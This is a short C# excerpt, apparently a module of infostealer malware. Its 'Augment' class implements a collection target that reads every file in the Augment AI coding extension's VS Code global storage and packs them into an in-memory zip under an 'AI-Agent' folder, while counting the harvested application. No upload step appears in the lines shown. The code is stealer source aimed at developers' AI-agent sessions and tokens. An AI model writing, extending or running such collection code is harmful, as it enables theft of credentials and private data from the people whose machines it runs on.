...
{
    public class Augment : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var entry = new Counter.CounterApplications { Name = "Augment" };
            string[] vscodeDirs = { "Code", "Code - Insiders" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string dir = Path.Combine(appdata, vscodeDir, "User", "globalStorage", "augment.vscode-augment");
                ...
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    ...
                    try
                    {
                        string rel = "AI-Agent\\Augment\\" + Path.GetFileName(file);
